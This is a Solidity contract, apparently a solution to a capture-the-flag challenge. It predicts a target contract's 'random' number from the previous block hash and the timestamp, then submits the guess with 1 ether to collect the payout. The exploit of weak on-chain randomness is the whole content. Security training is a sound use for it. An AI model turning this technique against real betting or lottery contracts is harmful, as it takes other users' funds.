interface GuessChallenge {
    function guess(uint8) external payable;
}

contract Solver {
    GuessChallenge public target;
    address public owner;

    function Solver(address _target) public payable {
        require(msg.value == 1 ether);
        target = GuessChallenge(_target);
        owner = msg.sender;
    }
    
    function solve() public payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        
        target.guess.value(1 ether)(answer);
    }
    
    function clear() public {
        selfdestruct(owner);
    }
    
    function() external payable {}
}
